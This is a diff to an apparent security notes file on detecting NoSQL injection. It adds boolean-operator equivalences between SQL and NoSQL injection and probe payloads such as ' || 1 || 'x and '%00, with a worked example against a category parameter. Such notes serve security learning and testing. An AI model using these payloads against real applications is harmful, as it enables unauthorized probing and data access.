@@ -1,3 +1,7 @@
+# Boolean difference between SQLi && NoSQLi
+  ```or``` >> ```||```
+  ```and``` >> ```&&```
+  ```-- -``` >> ```%00``` 
 # Detecting NoSQLi Vulnerability
 ```
 '
@@ -9,7 +13,10 @@
 ```
 ' && 0 && 'x
 ' && 1 && 'x
+' || 1 || 'x
+'%00
 ```
+You can also remove the ```x``` end of the payload.
 ## Example with explanation:
 
   1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
